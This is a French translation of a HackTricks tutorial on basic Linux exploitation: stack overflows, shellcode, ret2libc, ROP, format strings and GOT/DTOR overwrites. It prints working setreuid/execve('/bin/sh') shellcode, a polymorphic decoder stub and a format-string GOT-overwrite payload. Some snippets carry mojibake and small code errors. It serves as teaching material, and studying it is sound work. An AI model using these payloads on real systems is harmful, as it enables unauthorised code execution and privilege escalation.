# Exploitation Linux (Basique) (SPA)

## Exploitation Linux (Basique) (SPA)

<details>

<summary><strong>Apprenez le piratage AWS de z√©ro √† h√©ros avec</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Autres moyens de soutenir HackTricks :

* Si vous souhaitez voir votre **entreprise annonc√©e dans HackTricks** ou **t√©l√©charger HackTricks en PDF**, consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop)!
* Obtenez le [**merchandising officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* D√©couvrez [**La Famille PEASS**](https://opensea.io/collection/the-peass-family), notre collection d'[**NFTs**](https://opensea.io/collection/the-peass-family) exclusifs
* **Rejoignez le** üí¨ [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe telegram**](https://t.me/peass) ou **suivez**-moi sur **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Partagez vos astuces de piratage en soumettant des PR aux d√©p√¥ts github** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

## **ASLR**

Randomisation des adresses

**D√©sactiver la randomisation (ASLR) GLOBALE (root)** :\
echo 0 > /proc/sys/kernel/randomize\_va\_space\
R√©activer la randomisation GLOBALE : echo 2 > /proc/sys/kernel/randomize\_va\_space

**D√©sactiver pour une ex√©cution** (ne n√©cessite pas root) :\
setarch \`arch\` -R ./exemple arguments\
setarch \`uname -m\` -R ./exemple arguments

**D√©sactiver la protection d'ex√©cution de la pile**\
gcc -fno-stack-protector -D\_FORTIFY\_SOURCE=0 -z norelro -z execstack exemple.c -o exemple

**Fichier Core**\
ulimit -c unlimited\
gdb /exec fichier\_core\
/etc/security/limits.conf -> \* soft core unlimited

**Texte**\
**Donn√©es**\
**BSS**\
**Tas**

**Pile**

**Section BSS** : Variables globales ou statiques non initialis√©es
```
static int i;
```
**Section DATA** : Variables globales ou statiques initialis√©es
```
int i = 5;
```
**Section TEXT** : Instructions du code (opcodes)

**Section HEAP** : Buffers r√©serv√©s de mani√®re dynamique (malloc(), calloc(), realloc())

**Section STACK** : La pile (Arguments pass√©s, cha√Ænes d'environnement (env), variables locales‚Ä¶)

## **1. D√âBORDEMENTS DE PILE**

> buffer overflow, buffer overrun, stack overrun, stack smashing

Violation de segmentation ou faute de segmentation : Lorsqu'on tente d'acc√©der √† une adresse m√©moire qui n'a pas √©t√© attribu√©e au processus.

Pour obtenir l'adresse d'une fonction √† l'int√©rieur d'un programme, on peut faire :
```
objdump -d ./PROGRAMA | grep FUNCION
```
## ROP

### Appel √† sys\_execve

{% content-ref url="rop-syscall-execv.md" %}
[rop-syscall-execv.md](rop-syscall-execv.md)
{% endcontent-ref %}

## **2.SHELLCODE**

Voir les interruptions du noyau : cat /usr/include/i386-linux-gnu/asm/unistd\_32.h | grep ‚Äú\_\_NR\_‚Äù

setreuid(0,0); // \_\_NR\_setreuid 70\
execve(‚Äú/bin/sh‚Äù, args\[], NULL); // \_\_NR\_execve 11\
exit(0); // \_\_NR\_exit 1

xor eax, eax ; nettoyons eax\
xor ebx, ebx ; ebx = 0 car il n'y a pas d'argument √† passer\
mov al, 0x01 ; eax = 1 ‚Äî> \_\_NR\_exit 1\
int 0x80 ; Ex√©cuter syscall

**nasm -f elf assembly.asm** ‚Äî> Renvoie un .o\
**ld assembly.o -o shellcodeout** ‚Äî> Donne un ex√©cutable compos√© du code assembleur et nous pouvons extraire les opcodes avec **objdump**\
**objdump -d -Mintel ./shellcodeout** ‚Äî> Pour v√©rifier que c'est bien notre shellcode et extraire les OpCodes

**V√©rifier que la shellcode fonctionne**
```
char shellcode[] = ‚Äú\x31\xc0\x31\xdb\xb0\x01\xcd\x80‚Äù

void main(){
void (*fp) (void);
fp = (void *)shellcode;
fp();
}<span id="mce_marker" data-mce-type="bookmark" data-mce-fragment="1">‚Äã</span>
```
Pour v√©rifier que les appels syst√®me sont correctement effectu√©s, il faut compiler le programme pr√©c√©dent et les appels syst√®me devraient appara√Ætre dans **strace ./PROGRAMME\_COMPIL√â**

Lors de la cr√©ation de shellcodes, on peut utiliser une astuce. La premi√®re instruction est un saut vers un appel. L'appel invoque le code original et place √©galement l'EIP dans la pile. Apr√®s l'instruction d'appel, nous avons ins√©r√© la cha√Æne de caract√®res n√©cessaire, donc avec cet EIP, nous pouvons pointer vers la cha√Æne et continuer √† ex√©cuter le code.

EX **ASTUCE (/bin/sh)** :
```
jmp                 0x1f                                        ; Salto al √∫ltimo call
popl                %esi                                       ; Guardamos en ese la direcci√≥n al string
movl               %esi, 0x8(%esi)       ; Concatenar dos veces el string (en este caso /bin/sh)
xorl                 %eax, %eax             ; eax = NULL
movb  %eax, 0x7(%esi)     ; Ponemos un NULL al final del primer /bin/sh
movl               %eax, 0xc(%esi)      ; Ponemos un NULL al final del segundo /bin/sh
movl   $0xb, %eax               ; Syscall 11
movl               %esi, %ebx               ; arg1=‚Äú/bin/sh‚Äù
leal                 0x8(%esi), %ecx      ; arg[2] = {‚Äú/bin/sh‚Äù, ‚Äú0‚Äù}
leal                 0xc(%esi), %edx      ; arg3 = NULL
int                    $0x80                         ; excve(‚Äú/bin/sh‚Äù, [‚Äú/bin/sh‚Äù, NULL], NULL)
xorl                 %ebx, %ebx             ; ebx = NULL
movl   %ebx, %eax
inc                   %eax                          ; Syscall 1
int                    $0x80                         ; exit(0)
call                  -0x24                          ; Salto a la primera instruci√≥n
.string             \‚Äù/bin/sh\‚Äù                               ; String a usar<span id="mce_marker" data-mce-type="bookmark" data-mce-fragment="1">‚Äã</span>
```
**Exemple d'utilisation de la pile (/bin/sh) :**
```
section .text
global _start
_start:
xor                  eax, eax                     ;Limpieza
mov                al, 0x46                      ; Syscall 70
xor                  ebx, ebx                     ; arg1 = 0
xor                  ecx, ecx                     ; arg2 = 0
int                    0x80                           ; setreuid(0,0)
xor                  eax, eax                     ; eax = 0
push   eax                             ; ‚Äú\0‚Äù
push               dword 0x68732f2f ; ‚Äú//sh‚Äù
push               dword 0x6e69622f; ‚Äú/bin‚Äù
mov                ebx, esp                     ; arg1 = ‚Äú/bin//sh\0‚Äù
push               eax                             ; Null -> args[1]
push               ebx                             ; ‚Äú/bin/sh\0‚Äù -> args[0]
mov                ecx, esp                     ; arg2 = args[]
mov                al, 0x0b                      ; Syscall 11
int                    0x80                           ; excve(‚Äú/bin/sh‚Äù, args[‚Äú/bin/sh‚Äù, ‚ÄúNULL‚Äù], NULL)
```
**EJ FNSTENV :**
```
fabs
fnstenv [esp-0x0c]
pop eax                     ; Guarda el EIP en el que se ejecut√≥ fabs
‚Ä¶
```
**Chasseur d'≈ìuf :**

Il s'agit d'un petit code qui parcourt les pages m√©moire associ√©es √† un processus √† la recherche de la shellcode stock√©e (il cherche une signature plac√©e dans la shellcode). Utile dans les cas o√π l'on dispose seulement d'un petit espace pour injecter du code.

**Shellcodes polymorphiques**

Il s'agit de shellcodes chiffr√©es qui poss√®dent un petit code les d√©chiffrant et sautant vers elles, en utilisant l'astuce Call-Pop, voici un **exemple de chiffrement C√©sar** :
```
global _start
_start:
jmp short magic
init:
pop     esi
xor      ecx, ecx
mov    cl,0                              ; Hay que sustituir el 0 por la longitud del shellcode (es lo que recorrer√°)
desc:
sub     byte[esi + ecx -1], 0 ; Hay que sustituir el 0 por la cantidad de bytes a restar (cifrado cesar)
sub     cl, 1
jnz       desc
jmp     short sc
magic:
call init
sc:
;Aqu√≠ va el shellcode
```
1. **Attaque du Frame Pointer (EBP)**

Utile dans une situation o√π nous pouvons modifier l'EBP mais pas l'EIP.

On sait qu'√† la sortie d'une fonction, le code assembleur suivant est ex√©cut√© :
```
movl               %ebp, %esp
popl                %ebp
ret
```
```markdown
Ainsi, si l'EBP peut √™tre modifi√© lors de la sortie d'une fonction (fvuln) qui a √©t√© appel√©e par une autre fonction, lorsque la fonction appelante de fvuln se termine, son EIP peut √™tre modifi√©.

Dans fvuln, on peut introduire un faux EBP qui pointe vers un emplacement o√π se trouve l'adresse de la shellcode + 4 (il faut ajouter 4 √† cause du pop). Ainsi, lors de la sortie de la fonction, la valeur de &(\&Shellcode)+4 sera ins√©r√©e dans ESP, avec le pop ESP sera diminu√© de 4 et pointera vers l'adresse de la shellcode lorsque le ret sera ex√©cut√©.

**Exploit :**\
\&Shellcode + "AAAA" + SHELLCODE + remplissage + &(\&Shellcode)+4

**Exploit Off-by-One**\
Il est permis de modifier seulement le byte le moins significatif de l'EBP. Une attaque similaire √† la pr√©c√©dente peut √™tre men√©e, mais la m√©moire qui stocke l'adresse de la shellcode doit partager les 3 premiers bytes avec l'EBP.

## **4. M√©thodes return to Libc**

M√©thode utile lorsque la pile n'est pas ex√©cutable ou laisse un tampon tr√®s petit pour la modification.

L'ASLR fait que lors de chaque ex√©cution, les fonctions sont charg√©es √† des positions diff√©rentes en m√©moire. Par cons√©quent, cette m√©thode peut ne pas √™tre efficace dans ce cas. Pour les serveurs distants, comme le programme est ex√©cut√© constamment √† la m√™me adresse, cela peut √™tre utile.

* **cdecl (C declaration)** Place les arguments dans la pile et apr√®s la sortie de la fonction, nettoie la pile.
* **stdcall (standard call)** Place les arguments dans la pile et c'est la fonction appel√©e qui la nettoie.
* **fastcall** Place les deux premiers arguments dans les registres et le reste dans la pile.

On place l'adresse de l'instruction system de libc et on lui passe en argument la cha√Æne "/bin/sh", normalement depuis une variable d'environnement. De plus, on utilise l'adresse de la fonction exit pour que, une fois la shell inutile, le programme se termine sans probl√®me (et sans √©crire de logs).

**export SHELL=/bin/sh**

Pour trouver les adresses dont nous aurons besoin, on peut regarder dans **GDB :**\
**p system**\
**p exit**\
**rabin2 -i ex√©cutable** ‚Äî> Donne l'adresse de toutes les fonctions utilis√©es par le programme au chargement\
(Dans un start ou un breakpoint) : **x/500s $esp** ‚Äî> Nous cherchons ici la cha√Æne /bin/sh

Une fois que nous avons ces adresses, l'**exploit** serait :

"A" \* DISTANCE EBP + 4 (EBP : peuvent √™tre 4 "A" bien que mieux si c'est le vrai EBP pour √©viter les erreurs de segmentation) + Adresse de **system** (√©crasera l'EIP) + Adresse de **exit** (en sortant de system("/bin/sh") cette fonction sera appel√©e car les premiers 4 bytes de la pile sont trait√©s comme la prochaine adresse de l'EIP √† ex√©cuter) + Adresse de "**/bin/sh**" (sera le param√®tre pass√© √† system)

De cette mani√®re, l'EIP sera √©cras√© avec l'adresse de system qui recevra comme param√®tre la cha√Æne "/bin/sh" et en sortant de cette fonction, ex√©cutera la fonction exit().

Il est possible de se retrouver dans la situation o√π un byte de l'adresse d'une fonction est nul ou un espace (\x20). Dans ce cas, on peut d√©sassembler les adresses pr√©c√©dant cette fonction car il y a probablement plusieurs NOPs qui nous permettent d'appeler l'un d'eux au lieu de la fonction directement (par exemple avec > x/8i system-4).

Cette m√©thode fonctionne car en appelant une fonction comme system en utilisant l'opcode **ret** au lieu de **call**, la fonction comprend que les premiers 4 bytes seront l'adresse **EIP** √† laquelle revenir.

Une technique int√©ressante avec cette m√©thode est d'appeler **strncpy()** pour d√©placer un payload de la pile vers le tas, puis d'utiliser **gets()** pour ex√©cuter ce payload.

Une autre technique int√©ressante est l'utilisation de **mprotect()** qui permet d'attribuer les permissions souhait√©es √† n'importe quelle partie de la m√©moire. Utile ou utilis√© sur BSD, MacOS et OpenBSD, mais pas sur Linux (contr√¥le que les permissions d'√©criture et d'ex√©cution ne soient pas accord√©es en m√™me temps). Avec cette attaque, on pourrait reconfigurer la pile comme ex√©cutable.

**Cha√Ænage de fonctions**

Bas√© sur la technique pr√©c√©dente, cette forme d'exploit consiste en :\
Remplissage + \&Fonction1 + \&pop;ret; + \&arg\_fun1 + \&Fonction2 + \&pop;ret; + \&arg\_fun2 + ‚Ä¶

De cette mani√®re, on peut cha√Æner des fonctions √† appeler. De plus, si on veut utiliser des fonctions avec plusieurs arguments, on peut mettre les arguments n√©cessaires (ex 4) et placer les 4 arguments et chercher une adresse avec les opcodes : pop, pop, pop, pop, ret ‚Äî> **objdump -d ex√©cutable**

**Cha√Ænage par falsification de cadres (cha√Ænage d'EBPs)**

Consiste √† exploiter la capacit√© de manipuler l'EBP pour encha√Æner l'ex√©cution de plusieurs fonctions √† travers l'EBP et "leave;ret"

REMPLISSAGE

* On place dans l'EBP un faux EBP qui pointe vers : 2√®me EBP\_faux + la fonction √† ex√©cuter : (\&system() + \&leave;ret + &"/bin/sh")
* Dans l'EIP, on met l'adresse d'une fonction &(leave;ret)

On commence la shellcode avec l'adresse de la partie suivante de la shellcode, par exemple : 2√®meEBP\_faux + \&system() + &(leave;ret;) + &"/bin/sh"

le 2√®meEBP serait : 3√®meEBP\_faux + \&system() + &(leave;ret;) + &"/bin/ls"

Cette shellcode peut √™tre r√©p√©t√©e ind√©finiment dans les parties de la m√©moire auxquelles on a acc√®s, de sorte qu'on obtient une shellcode facilement divisible en petits morceaux de m√©moire.

(On encha√Æne l'ex√©cution de fonctions en m√©langeant les vuln√©rabilit√©s vues pr√©c√©demment d'EBP et de ret2lib)

## **5. M√©thodes compl√©mentaires**

**Ret2Ret**

Utile lorsque l'on ne peut pas mettre une adresse de la pile dans l'EIP (on v√©rifie que l'EIP ne contient pas 0xbf) ou lorsque l'on ne peut pas calculer l'emplacement de la shellcode. Mais, la fonction vuln√©rable accepte un param√®tre (la shellcode ira ici).

Ainsi, en changeant l'EIP par une adresse √† un **ret**, la prochaine adresse sera charg√©e (qui est l'adresse du premier argument de la fonction). C'est-√†-dire, la shellcode sera charg√©e.

L'exploit serait : SHELLCODE + Remplissage (jusqu'√† EIP) + **\&ret** (les bytes suivants de la pile pointent vers le d√©but de la shellcode car l'adresse du param√®tre pass√© est mise dans la pile)

Il semble que des fonctions comme **strncpy** une fois compl√®tes √©liminent de la pile l'adresse o√π √©tait stock√©e la shellcode rendant cette technique impossible. C'est-√†-dire, l'adresse qui est pass√©e √† la fonction comme argument (celle qui stocke la shellcode) est modifi√©e par un 0x00 de sorte qu'en appelant le second **ret** on rencontre un 0x00 et le programme se termine.
```
```
**Ret2PopRet**
```
Si nous n'avons pas le contr√¥le sur le premier argument mais que nous avons le contr√¥le sur le second ou le troisi√®me, nous pouvons r√©√©crire EIP avec une adresse √† pop-ret ou pop-pop-ret, selon celle dont nous avons besoin.

**Technique de Murat**

Sous Linux, tous les programmes sont mapp√©s en commen√ßant √† 0xbfffffff.

En observant comment la pile d'un nouveau processus est construite sous Linux, on peut d√©velopper un exploit de sorte que le programme soit lanc√© dans un environnement dont la seule variable est la shellcode. L'adresse de celle-ci peut alors √™tre calcul√©e comme suit : addr = 0xbfffffff - 4 - strlen(NOM\_ex√©cutable\_complet) - strlen(shellcode)

Ainsi, on obtient facilement l'adresse o√π se trouve la variable d'environnement avec la shellcode.

Cela est possible gr√¢ce √† la fonction execle qui permet de cr√©er un environnement qui ne contient que les variables d'environnement souhait√©es.

**Jump to ESP : Style Windows**

Puisque l'ESP pointe toujours au d√©but de la pile, cette technique consiste √† remplacer l'EIP par l'adresse d'un appel √† **jmp esp** ou **call esp**. De cette mani√®re, la shellcode est stock√©e apr√®s la r√©√©criture de l'EIP car apr√®s l'ex√©cution du **ret**, l'ESP pointera vers l'adresse suivante, juste l√† o√π la shellcode a √©t√© sauvegard√©e.

Si l'ASLR n'est pas activ√© sous Windows ou Linux, on peut appeler **jmp esp** ou **call esp** stock√©s dans un objet partag√©. Si l'ASLR est activ√©, on pourrait chercher dans le programme vuln√©rable lui-m√™me.

De plus, le fait de pouvoir placer la shellcode apr√®s la corruption de l'EIP au lieu de la mettre au milieu de la pile, permet d'√©viter que les instructions push ou pop qui sont ex√©cut√©es au milieu de la fonction n'affectent la shellcode (ce qui pourrait se produire si elle √©tait plac√©e au milieu de la pile de la fonction).

De mani√®re tr√®s similaire, si nous savons qu'une fonction renvoie l'adresse o√π la shellcode est stock√©e, on peut appeler **call eax** ou **jmp eax (ret2eax).**

**ROP (Return Oriented Programming) ou morceaux de code emprunt√©s**

Les morceaux de code qui sont invoqu√©s sont connus sous le nom de gadgets.

Cette technique consiste √† encha√Æner diff√©rents appels √† des fonctions en utilisant la technique de **ret2libc** et l'usage de **pop, ret**.

Dans certaines architectures de processeurs, chaque instruction est un ensemble de 32 bits (par exemple, MIPS). Cependant, chez Intel, les instructions sont de taille variable et plusieurs instructions peuvent partager un ensemble de bits, par exemple :

**movl $0xe4ff, -0x(%ebp)** ‚Äî> Contient les octets 0xffe4 qui se traduisent √©galement par : **jmp \*%esp**

De cette mani√®re, il est possible d'ex√©cuter certaines instructions qui ne sont m√™me pas dans le programme original.

**ROPgadget.py** nous aide √† trouver des valeurs dans des binaires.

Ce programme est √©galement utile pour cr√©er des **payloads**. Vous pouvez lui donner la biblioth√®que √† partir de laquelle vous souhaitez extraire les ROPs et il g√©n√©rera un payload en python auquel vous donnez l'adresse √† laquelle se trouve ladite biblioth√®que et le payload est alors pr√™t √† √™tre utilis√© comme shellcode. De plus, comme il utilise des appels syst√®me, il n'ex√©cute r√©ellement rien dans la pile mais stocke simplement des adresses de ROPs qui seront ex√©cut√©es via **ret**. Pour utiliser ce payload, il faut appeler le payload par une instruction **ret**.

**D√©passements d'entiers**

Ce type de d√©passements se produit lorsqu'une variable n'est pas pr√©par√©e √† supporter un nombre aussi grand que celui qui lui est pass√©, possiblement √† cause d'une confusion entre des variables sign√©es et non sign√©es, par exemple :
```c
#include <stdion.h>
#include <string.h>
#include <stdlib.h>

int main(int argc, char *argv[]){
int len;
unsigned int l;
char buffer[256];
int i;
len = l = strtoul(argv[1], NULL, 10);
printf("\nL = %u\n", l);
printf("\nLEN = %d\n", len);
if (len >= 256){
printf("\nLongitus excesiva\n");
exit(1);
}
if(strlen(argv[2]) < l)
strcpy(buffer, argv[2]);
else
printf("\nIntento de hack\n");
return 0;
}
```
Dans l'exemple pr√©c√©dent, nous voyons que le programme attend 2 param√®tres. Le premier est la longueur de la cha√Æne suivante et le second est la cha√Æne.

Si nous passons un nombre n√©gatif comme premier param√®tre, il en r√©sultera que len < 256 et nous passerons ce filtre, et de plus strlen(buffer) sera inf√©rieur √† l, car l est un unsigned int et sera tr√®s grand.

Ce type de d√©passements de capacit√© ne cherche pas √† √©crire quelque chose dans le processus du programme, mais plut√¥t √† d√©passer des filtres mal con√ßus pour exploiter d'autres vuln√©rabilit√©s.

**Variables non initialis√©es**

On ne conna√Æt pas la valeur qu'une variable non initialis√©e peut prendre et il pourrait √™tre int√©ressant de l'observer. Il se peut qu'elle prenne la valeur qu'avait une variable de la fonction pr√©c√©dente et que celle-ci soit contr√¥l√©e par l'attaquant.

## **Format Strings**

En C, **`printf`** est une fonction qui peut √™tre utilis√©e pour **imprimer** une cha√Æne de caract√®res. Le **premier param√®tre** que cette fonction attend est le **texte brut avec les formateurs**. Les **param√®tres suivants** attendus sont les **valeurs** pour **substituer** les **formateurs** dans le texte brut.

La vuln√©rabilit√© appara√Æt lorsque **un texte d'attaquant est mis comme premier argument** √† cette fonction. L'attaquant pourra cr√©er une **entr√©e sp√©ciale en abusant** des capacit√©s de la cha√Æne de format **printf** pour **√©crire n'importe quelle donn√©e √† n'importe quelle adresse**. Ce faisant, il sera capable d'**ex√©cuter du code arbitraire**.

Formateurs :
```bash
%08x ‚Äî> 8 hex bytes
%d ‚Äî> Entire
%u ‚Äî> Unsigned
%s ‚Äî> String
%n ‚Äî> Number of written bytes
%hn ‚Äî> Occupies 2 bytes instead of 4
<n>$X ‚Äî> Direct access, Example: ("%3$d", var1, var2, var3) ‚Äî> Access to var3
```
**`%n`** **√©crit** le **nombre d'octets √©crits** √† l'**adresse indiqu√©e. √âcrire** autant d'**octets** que le nombre hexad√©cimal que nous **devons** √©crire est la mani√®re de **√©crire n'importe quelle donn√©e**.
```bash
AAAA%.6000d%4\$n ‚Äî> Write 6004 in the address indicated by the 4¬∫ param
AAAA.%500\$08x ‚Äî> Param at offset 500
```
### GOT (Global Offsets Table) / PLT (Procedure Linkage Table)

C'est la table qui contient **l'adresse** des **fonctions externes** utilis√©es par le programme.

Obtenez l'adresse de cette table avec : **`objdump -s -j .got ./exec`**

![](<../../.gitbook/assets/image (619).png>)

Observez comment apr√®s **le chargement** de **l'ex√©cutable** dans GEF, vous pouvez **voir** les **fonctions** qui sont dans le **GOT** : `gef‚û§ x/20x 0xDIR_GOT`

![](<../../.gitbook/assets/image (620) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (5).png>)

En utilisant GEF, vous pouvez **d√©marrer** une session de **d√©bogage** et ex√©cuter **`got`** pour voir la table got :

![](<../../.gitbook/assets/image (621).png>)

Dans un binaire, le GOT a les **adresses des fonctions ou** de la section **PLT** qui chargera l'adresse de la fonction. L'objectif de cette exploitation est de **remplacer l'entr√©e GOT** d'une fonction qui sera ex√©cut√©e plus tard **avec** **l'adresse** de la PLT de la **fonction `system`**. Id√©alement, vous **remplacerez** le **GOT** d'une **fonction** qui **sera appel√©e avec des param√®tres contr√¥l√©s par vous** (ainsi vous pourrez contr√¥ler les param√®tres envoy√©s √† la fonction system).

Si **`system`** **n'est pas utilis√©** par le script, la fonction system **n'aura pas** d'entr√©e dans le GOT. Dans ce sc√©nario, vous devrez **d'abord divulguer l'adresse** de la fonction `system`.

**Procedure Linkage Table** est une table **en lecture seule** dans le fichier ELF qui stocke tous les **symboles n√©cessitant une r√©solution**. Lorsqu'une de ces fonctions est appel√©e, le **GOT** **redirigera** le **flux** vers le **PLT** pour qu'il puisse **r√©soudre** **l'adresse** de la fonction et l'√©crire dans le GOT.
Ensuite, la **prochaine fois** qu'un appel est effectu√© √† cette adresse, la **fonction** est **appel√©e directement** sans avoir besoin de la r√©soudre.

Vous pouvez voir les adresses PLT avec **`objdump -j .plt -d ./vuln_binary`**

### **D√©roulement de l'Exploit**

Comme expliqu√© pr√©c√©demment, l'objectif va √™tre de **remplacer** **l'adresse** d'une **fonction** dans la table **GOT** qui sera appel√©e plus tard. Id√©alement, nous pourrions d√©finir **l'adresse vers un shellcode** situ√© dans une section ex√©cutable, mais il est tr√®s probable que vous ne pourrez pas √©crire un shellcode dans une section ex√©cutable.
Ainsi, une autre option est de **remplacer** une **fonction** qui **re√ßoit** ses **arguments** de **l'utilisateur** et de la **pointer** vers la **fonction `system`**.

Pour √©crire l'adresse, g√©n√©ralement 2 √©tapes sont effectu√©es : Vous **√©crivez d'abord 2 octets** de l'adresse puis les 2 autres. Pour ce faire, **`$hn`** est utilis√©.

**HOB** fait r√©f√©rence aux 2 octets sup√©rieurs de l'adresse\
**LOB** fait r√©f√©rence aux 2 octets inf√©rieurs de l'adresse

Ainsi, en raison du fonctionnement des cha√Ænes de format, vous devez **√©crire d'abord le plus petit** de \[HOB, LOB] puis l'autre.

Si HOB < LOB\
`[adresse+2][adresse]%.[HOB-8]x%[d√©calage]\$hn%.[LOB-HOB]x%[d√©calage+1]`

Si HOB > LOB\
`[adresse+2][adresse]%.[LOB-8]x%[d√©calage+1]\$hn%.[HOB-LOB]x%[d√©calage]`

HOB LOB HOB_shellcode-8 N¬∫Param_dir_HOB LOB_shell-HOB_shell N¬∫Param_dir_LOB

\`python -c 'print "\x26\x97\x04\x08"+"\x24\x97\x04\x08"+ "%.49143x" + "%4$hn" + "%.15408x" + "%5$hn"'\`

### **Mod√®le d'Exploit de Cha√Æne de Format**

Vous pouvez trouver un **mod√®le** pour exploiter le GOT en utilisant des cha√Ænes de format ici :

{% content-ref url="format-strings-template.md" %}
[format-strings-template.md](format-strings-template.md)
{% endcontent-ref %}

### **.fini_array**

Essentiellement, c'est une structure avec **des fonctions qui seront appel√©es** avant que le programme ne se termine. Cela est int√©ressant si vous pouvez appeler votre **shellcode en sautant simplement √† une adresse**, ou dans les cas o√π vous devez revenir au main √† nouveau pour **exploiter la cha√Æne de format une seconde fois**.
```bash
objdump -s -j .fini_array ./greeting

./greeting:     file format elf32-i386

Contents of section .fini_array:
8049934 a0850408

#Put your address in 0x8049934
```
Notez que cela **ne cr√©era pas** une **boucle √©ternelle** car lorsque vous revenez √† la fonction principale, le canari remarquera que la fin de la pile pourrait √™tre corrompue et la fonction ne sera pas rappel√©e √† nouveau. Ainsi, avec cela, vous pourrez **avoir 1 ex√©cution suppl√©mentaire** de la vuln.

### **Cha√Ænes de format pour extraire le contenu**

Une cha√Æne de format peut √©galement √™tre d√©tourn√©e pour **extraire le contenu** de la m√©moire du programme.\
Par exemple, dans la situation suivante, il y a une **variable locale dans la pile pointant vers un drapeau.** Si vous **trouvez** o√π dans la **m√©moire** le **pointeur** vers le **drapeau** se trouve, vous pouvez faire en sorte que **printf acc√®de** √† cette **adresse** et **imprime** le **drapeau** :

Donc, le drapeau se trouve en **0xffffcf4c**

![](<../../.gitbook/assets/image (618) (2).png>)

Et √† partir de la fuite, vous pouvez voir que le **pointeur vers le drapeau** est dans le **8√®me** param√®tre :

![](<../../.gitbook/assets/image (623).png>)

Donc, en **acc√©dant** au **8√®me param√®tre**, vous pouvez obtenir le drapeau :

![](<../../.gitbook/assets/image (624).png>)

Notez qu'en suivant **l'exploit pr√©c√©dent** et en r√©alisant que vous pouvez **extraire le contenu**, vous pouvez **d√©finir des pointeurs** vers **`printf`** vers la section o√π l'**ex√©cutable** est **charg√©** et **le vider** **enti√®rement** !

### **DTOR**

{% hint style="danger" %}
De nos jours, il est tr√®s **rare de trouver un binaire avec une section dtor**.
{% endhint %}

Les destructeurs sont des fonctions qui sont **ex√©cut√©es avant que le programme ne se termine**.\
Si vous parvenez √† **√©crire** une **adresse** vers un **shellcode** dans **`__DTOR_END__`**, cela sera **ex√©cut√©** avant que le programme ne se termine.\
Obtenez l'adresse de cette section avec :
```bash
objdump -s -j .dtors /exec
rabin -s /exec | grep ‚Äú__DTOR‚Äù
```
Habituellement, vous trouverez la section **DTOR** **entre** les valeurs `ffffffff` et `00000000`. Donc, si vous voyez juste ces valeurs, cela signifie qu'il **n'y a aucune fonction enregistr√©e**. Donc, **√©crasez** le **`00000000`** avec l'**adresse** vers le **shellcode** pour l'ex√©cuter.

### **Cha√Ænes de formatage pour d√©bordements de tampon**

La fonction **sprintf d√©place** une cha√Æne format√©e **vers** une **variable**. Par cons√©quent, vous pourriez abuser du **formatage** d'une cha√Æne pour provoquer un **d√©bordement de tampon dans la variable** o√π le contenu est copi√©.\
Par exemple, la charge utile `%.44xAAAA` va **√©crire 44B+"AAAA" dans la variable**, ce qui peut causer un d√©bordement de tampon.

### **Structures \_\_atexit**

{% hint style="danger" %}
De nos jours, il est tr√®s **rare d'exploiter cela**.
{% endhint %}

**`atexit()`** est une fonction √† laquelle **d'autres fonctions sont pass√©es en param√®tres**. Ces **fonctions** seront **ex√©cut√©es** lors de l'ex√©cution d'un **`exit()`** ou du **retour** de la **fonction principale**.\
Si vous pouvez **modifier** l'**adresse** de l'une de ces **fonctions** pour pointer vers un shellcode par exemple, vous prendrez le **contr√¥le** du **processus**, mais c'est actuellement plus compliqu√©.\
Actuellement, les **adresses des fonctions** √† ex√©cuter sont **cach√©es** derri√®re plusieurs structures et finalement l'adresse √† laquelle elles pointent n'est pas celle des fonctions, mais est **chiffr√©e avec XOR** et des d√©placements avec une **cl√© al√©atoire**. Donc actuellement ce vecteur d'attaque est **peu utile au moins sur x86** et **x64\_86**.\
La **fonction de chiffrement** est **`PTR_MANGLE`**. **D'autres architectures** telles que m68k, mips32, mips64, aarch64, arm, hppa... **n'impl√©mentent pas la fonction de chiffrement** car elle **renvoie la m√™me chose** qu'elle a re√ßu en entr√©e. Donc ces architectures pourraient √™tre attaquables par ce vecteur.

### **setjmp() & longjmp()**

{% hint style="danger" %}
De nos jours, il est tr√®s **rare d'exploiter cela**.
{% endhint %}

**`Setjmp()`** permet de **sauvegarder** le **contexte** (les registres)\
**`longjmp()`** permet de **restaurer** le **contexte**.\
Les **registres sauvegard√©s** sont : `EBX, ESI, EDI, ESP, EIP, EBP`\
Ce qui se passe, c'est que EIP et ESP sont pass√©s par la fonction **`PTR_MANGLE`**, donc les **architectures vuln√©rables √† cette attaque sont les m√™mes que ci-dessus**.\
Ils sont utiles pour la r√©cup√©ration d'erreurs ou les interruptions.\
Cependant, d'apr√®s ce que j'ai lu, les autres registres ne sont pas prot√©g√©s, **donc si il y a un `call ebx`, `call esi` ou `call edi`** √† l'int√©rieur de la fonction appel√©e, le contr√¥le peut √™tre pris. Ou vous pourriez √©galement modifier EBP pour modifier ESP.

**VTable et VPTR en C++**

Chaque classe a une **Vtable** qui est un tableau de **pointeurs vers des m√©thodes**.

Chaque objet d'une **classe** a un **VPtr** qui est un **pointeur** vers le tableau de sa classe. Le VPtr fait partie de l'en-t√™te de chaque objet, donc si un **√©crasement** du **VPtr** est r√©alis√©, il pourrait √™tre **modifi√©** pour **pointer** vers une m√©thode factice afin que l'ex√©cution d'une fonction aille vers le shellcode.

## **Mesures pr√©ventives et √©vasions**

**ASLR pas si al√©atoire**

PaX divise l'espace d'adresse du processus en 3 groupes :

Code et donn√©es initialis√©es et non initialis√©es : .text, .data et .bss ‚Äî> 16 bits d'entropie dans la variable delta\_exec, cette variable est initi√©e al√©atoirement avec chaque processus et est ajout√©e aux adresses initiales

M√©moire allou√©e par mmap() et biblioth√®ques partag√©es ‚Äî> 16 bits, delta\_mmap

La pile ‚Äî> 24 bits, delta\_stack ‚Äî> R√©ellement 11 (du 10√®me au 20√®me byte inclus) ‚Äî> align√© √† 16 bytes ‚Äî> 524.288 adresses r√©elles possibles de la pile

